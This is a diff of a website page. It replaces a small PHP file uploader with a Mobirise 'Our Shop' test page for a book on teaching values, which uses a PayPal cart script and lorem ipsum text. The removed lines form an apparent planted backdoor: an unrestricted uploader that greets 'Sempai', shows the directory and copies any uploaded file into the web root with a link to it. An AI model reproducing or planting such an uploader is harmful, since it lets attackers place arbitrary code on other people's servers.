@@ -1,47 +1,175 @@
-<!DOCTYPE HTML>
-<html lang="en-US">
+
+<!DOCTYPE html>
+<html  >
 <head>
-	<meta charset="UTF-8">
+  
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
+  <link rel="shortcut icon" href="assets/images/favicon.ico" type="image/x-icon">
+  <meta name="description" content="Test page">
+  
+  
+  <title>Test</title>
+  <link rel="stylesheet" href="assets/web/assets/mobirise-icons/mobirise-icons.css">
+  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
+  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-grid.min.css">
+  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-reboot.min.css">
+  <link rel="stylesheet" href="assets/tether/tether.min.css">
+  <link rel="stylesheet" href="assets/dropdown/css/style.css">
+  <link rel="stylesheet" href="assets/socicon/css/styles.css">
+  <link rel="stylesheet" href="assets/theme/css/style.css">
+  <link rel="preload" href="https://fonts.googleapis.com/css?family=Rubik:300,300i,400,400i,500,500i,700,700i,900,900i&display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Rubik:300,300i,400,400i,500,500i,700,700i,900,900i&display=swap"></noscript>
+  <link rel="preload" as="style" href="assets/mobirise/css/mbr-additional.css"><link rel="stylesheet" href="assets/mobirise/css/mbr-additional.css" type="text/css">
+  
+  
+  <script type="text/javascript" src="/ppCart/paypal.faq.js?ver=1.01"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<link type="text/css" rel="stylesheet" href="/ppCart/cart.css?ver=1.01"/>
+<script type="text/javascript" src="/ppCart/cart.js?ver=1.02"></script>
+
+  
 </head>
 <body>
-<script>
-    </script>
-</style>
+  
+  <section class="extMenu4 menu cid-rTA1ipjeOw" once="menu" id="extMenu4-2s">
 
-<body>
+    
+    
 
-<center>
-<font color='Black' size="5px">Hi Sempai (ᗒᗩᗕ) </font><br>
-<?php
-echo '<big><span style="color: black;">Directory: <span style="color: gray;">'.getcwd().'</span></big><br><br>';
-echo "<form method='post' enctype='multipart/form-data'>
-	  <input type='file' name='just_file'>
-	  <input type='submit' name='upload' value='Upload!'>
-	  </form>
-	  </center>";
-$root = $_SERVER['DOCUMENT_ROOT'];
-$files = $_FILES['just_file']['name'];
-$dest = $root.'/'.$files;
-if(isset($_POST['upload'])) {
-	if(is_writable($root)) {
-		if(@copy($_FILES['just_file']['tmp_name'], $dest)) {
-			$web = "http://".$_SERVER['HTTP_HOST']."/";
-			echo "<font color='lime'sukses upload -> <center><a href='$web$files' target='_blank'><b><u>$web/$files</u></b></a></center>";
-		} else {
-			echo "<font color='red'gagal upload di document root.";
-		}
-	} else {
-		if(@copy($_FILES['just_file']['tmp_name'], $files)) {
-			echo " upload <b>$files</b> di folder ini";
-		} else {
-			echo "gagal upload";
-		}
-	}
-}
-?>
-</body>
-<br>
-<br>
-<br>
+    <nav class="navbar navbar-dropdown navbar-fixed-top navbar-expand-lg">
+        <div class="navbar-brand">
+            
+            <span class="navbar-caption-wrap"><a class="navbar-caption text-white display-2" href="index.html#header2-2">TVoBH</a></span>
+        </div>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+            <div class="hamburger">
+                <span></span>
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </button>
+      <div class="collapse navbar-collapse" id="navbarSupportedContent">
+            <ul class="navbar-nav nav-dropdown nav-right" data-app-modern-menu="true"><li class="nav-item"><a class="nav-link link text-white display-4" href="index.html#features11-5"><p>Intro&nbsp;</p><p><br></p></a></li><li class="nav-item"><a class="nav-link link text-white display-4" href="webinars.html#header9-2l">Educator<br>Webinars</a></li><li class="nav-item"><a class="nav-link link text-white display-4" href="index.html#services1-9">Buy<br>books</a></li>
+                <li class="nav-item">
+                    <a class="nav-link link text-white display-4" href="index.html#features11-7">
+                        Mark's<br>bio</a>
+                </li><li class="nav-item"><a class="nav-link link text-white display-4" href="index.html#features11-c">Invite<br>Mark<br></a></li><li class="nav-item"><a class="nav-link link text-white display-4" href="index.html#extContent16-g">Free<br>downloads<br></a></li><li class="nav-item"><a class="nav-link link text-white display-4" href="Chapter.html#content4-w">TVoBH<br>Chapters<br></a></li><li class="nav-item"><a class="nav-link link text-white display-4" href="https://teachingvaluesofbeinghuman.com.au/Videos.html">TVoBH<br>Videos<br></a></li><li class="nav-item"><a class="nav-link link text-white display-4" href="index.html#contacts3-k">Contact<br>us<br></a></li><li class="nav-item"><a class="nav-link link text-white display-4" href="index.html#copyright">Copyright<br><br></a></li></ul>
+            
+            
+      </div>
+    </nav>
+</section>
+
+<section class="services1 cid-sDLw0fOBke" id="services1-2t">
+    <!---->
+    
+    <!---->
+    <!--Overlay-->
+    
+    <!--Container-->
+    <div class="container">
+        <div class="row justify-content-center">
+            <!--Titles-->
+            <div class="title pb-5 col-12">
+                <h2 class="align-left pb-3 mbr-fonts-style display-1">
+                    Our Shop
+                </h2>
+                <h3 class="mbr-section-subtitle mbr-light mbr-fonts-style display-5">
+                    Test shopping cart</h3>
+            </div>
+            <!--Card-1-->
+            <div class="card col-12 col-md-6 p-3 col-lg-4">
+                <div class="card-wrapper">
+                    <div class="card-img">
+                        <img src="assets/images/teaching-values-of-being-human-small-cover-436x618.jpg" alt="">
+                    </div>
+                    <div class="card-box">
+                        <h4 class="card-title mbr-fonts-style display-5">
+                            TVoBH</h4>
+                        <p class="mbr-text mbr-fonts-style display-7">
+                            Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ab accusantium dolores doloribus
+                            eligendi eum illo placeat quis repellendus sequi tempore!
+                        </p>
+                        <!--Btn-->
+                        <div class="mbr-section-btn align-left"><a href="#" class="btn btn-warning-outline display-4" pid="P1" text="Book: Teaching Values of Being Human" price="6300" weight="700" onclick="cart.add(this)">Add TVoBH to cart | $63</a></div>
+                    </div>
+                </div>
+            </div>
+            <!--Card-2-->
+            <div class="card col-12 col-md-6 p-3 col-lg-4">
+                <div class="card-wrapper">
+                    <div class="card-img">
+                        <img src="assets/images/product1.jpg" alt="">
+                    </div>
+                    <div class="card-box">
+                        <h4 class="card-title mbr-fonts-style display-5">
+                            Watch Special
+                        </h4>
+                        <p class="mbr-text mbr-fonts-style display-7">
+                            Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ab accusantium dolores doloribus
+                            eligendi eum illo placeat quis repellendus sequi tempore!
+                        </p>
+                        <!--Btn-->
+                        <div class="mbr-section-btn align-left">
+                            <a href="#" class="btn btn-warning-outline display-4">
+                                $ 690
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!--Card-3-->
+            <div class="card col-12 col-md-6 p-3 col-lg-4 last-child">
+                <div class="card-wrapper">
+                    <div class="card-img">
+                        <img src="assets/images/product1.jpg" alt="">
+                    </div>
+                    <div class="card-box">
+                        <h4 class="card-title mbr-fonts-style display-5">
+                            Watch Srong
+                        </h4>
+                        <p class="mbr-text mbr-fonts-style display-7">
+                            Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ab accusantium dolores doloribus
+                            eligendi eum illo placeat quis repellendus sequi tempore!
+                        </p>
+                        <!--Btn-->
+                        <div class="mbr-section-btn align-left">
+                            <a href="#" class="btn btn-warning-outline display-4">
+                                $ 990
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!--Card-4-->
+            
+        </div>
+    </div>
+</section>
+
+
+<script src="assets/popper/popper.min.js"></script>
+  <script src="assets/web/assets/jquery/jquery.min.js"></script>
+  <script src="assets/bootstrap/js/bootstrap.min.js"></script>
+  <script src="assets/tether/tether.min.js"></script>
+  <script src="assets/smoothscroll/smooth-scroll.js"></script>
+  <script src="assets/dropdown/js/nav-dropdown.js"></script>
+  <script src="assets/dropdown/js/navbar-dropdown.js"></script>
+  <script src="assets/touchswipe/jquery.touch-swipe.min.js"></script>
+  <script src="assets/theme/js/script.js"></script>
+  
+  <script type="text/javascript">
+  renderCarts();
+  renderFAQ();
+  
+  cart.cartName = "tvCart";
+  cart.postage.push({weight: 100000, price: 2000});
+</script>
+
+  
 </body>
 </html>
